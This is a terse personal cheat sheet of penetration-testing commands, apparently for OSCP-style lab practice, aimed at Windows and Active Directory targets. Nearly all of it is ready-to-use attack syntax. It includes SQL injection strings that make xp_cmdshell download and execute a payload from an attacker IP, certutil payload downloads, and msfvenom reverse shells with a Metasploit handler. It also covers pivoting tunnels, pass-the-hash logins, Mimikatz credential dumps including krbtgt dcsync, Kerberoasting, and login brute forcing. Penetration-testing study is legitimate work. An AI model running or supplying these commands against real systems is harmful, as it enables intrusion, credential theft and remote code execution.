Big Book: https://cheatsheet.haax.fr/windows-systems/exploitation/crackmapexec/

I try to keep my notes as lean as possible. This is overall meant to be used as syntax refreshers.
______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________

Downloading Files:
powershell iwr function, but it sometimes blocked by perms.

certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe
______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________

SQL:

check for perms:
Use master
EXEC sp_helprotect 'xp_cmdshell'

Upload:
test'; EXEC xp_cmdshell "powershell iwr -uri http://192.168.1.2/test.exe -outfile C:\\Users\Public\\payload.exe"-- 

Execute:
a' exec xp_cmdshell "powershell C:\\Users\\Public\\payload.exe"-- 
______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________

Escelate Priv:

https://github.com/BeichenDream/GodPotato/releases/tag/V1.20
https://github.com/itm4n/PrintSpoofer | PrintSpoofer.exe -i -c cmd

check running services with net start
check scheduled tasks with Get-ScheduledTask

Search Windows:
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue

Get-ChildItem -Path C:\Users\test\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue

net start

get-service

Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________

Metasploit Handler:

https://www.offsec.com/metasploit-unleashed/binary-payloads/ | use exploit/multi/handler | set payload windows/x64/shell_reverse_tcp


______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________

MSFVenom:

https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/

msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe

______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________

Chisel:

https://blog.mkiesel.ch/posts/oscp_pivoting/

chisel server --port PORT --socks5 --reverse

.\chisel.exe client --max-retry-count 1 IP:PORT R:socks
______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
ligolo-ng

sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:443
.\agent.exe -connect 192.168.45.165:443 -ignore-cert
sudo ip route add 172.16.4.0/24 dev ligolo
nmap 172.16.138.20 -Pn -PE
______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________

Impacket (more like godpacket):

https://kylemistele.medium.com/impacket-deep-dives-vol-1-command-execution-abb0144a351d

impacket-psexec domain/username:"pass"@IP
impacket-psexec -hashes 00000000000000000000000000000000:HASH administrator:@192.168.200.200

impacket-smbserver kali . -smb2support -user kali -password kali
net use P: \\192.168.45.191\kali /user:kali kali
copy filename.txt \\192.168.45.184\kali

impacket-mssqlclient emma:'Som!'@192.168.197.248 -port 49965 -windows-auth

impacket-rdp_check

impacket-secretsdump -system SYSTEM -sam SAM LOCAL

for kerberoasting from linux: sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________

Pesky Service Perms?
try rebooting computer, or stopping then starting, or restarting, or sc.exe start [servicename]
remember, you can try doing a dll hijack, or you can try the easy way and just swap the exe.

______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________

crackmapexec:
crackmapexec smb/winrm/ldap/rdp/ftp/mssql/ssh 172.16.199.0/24 -u 'user' -p 'pass' -d domain (--shares)

Evil-winrm:
evil-winrm -u Administrator -p 'EverybodyWantsToWorkAtP.O.O.'  -i <IP>/<Domain> | can also use hash with -H
______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________

Mimikatz:
sekurlsa::logonpasswords
lsadump::sam
lsadump::cache
lsadump::dcsync /user:domain\krbtgt /domain:lab.local
______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________

smbmap:
smbmap -H 192.168.197.248 -u zac -p 54abdf854 -d relia.com
______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
smbclient:
smbclient //192.168.197.248/transfer -U zach --pw-nt-hash 54ab -W relia.com
proxychains -q smbclient //172.16.81.21/scripts -U relia.com/jim --password 'C'
______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
rdesktop:
proxychains -q rdesktop -u administrator -p 'va' 172.16.81.6
______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
git:
git-dumper [http]
git show [hash id]
git log
git status
git reset --hard [git id hash]
______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
john:
zip2john file.zip > crack.txt
john --wordlist=/usr/share/wordlists/rockyou.txt crack.txt
______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
reg/putty:
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername"
reg query HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
crontab:
/etc/init.d
/etc/cron*
/etc/crontab
/etc/cron.allow
/etc/cron.d 
/etc/cron.deny
/etc/cron.daily
/etc/cron.hourly
/etc/cron.monthly
/etc/cron.weekly
/etc/sudoers
/etc/exports
/etc/anacrontab
/var/spool/cron
/var/spool/cron/crontabs/root

crontab -l
ls -alh /var/spool/cron;
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny*
______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
hydra:
hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
responder:
sudo responder -I tun0 -A
______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
Kerberoasting:
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
crack with 13100 hashcat
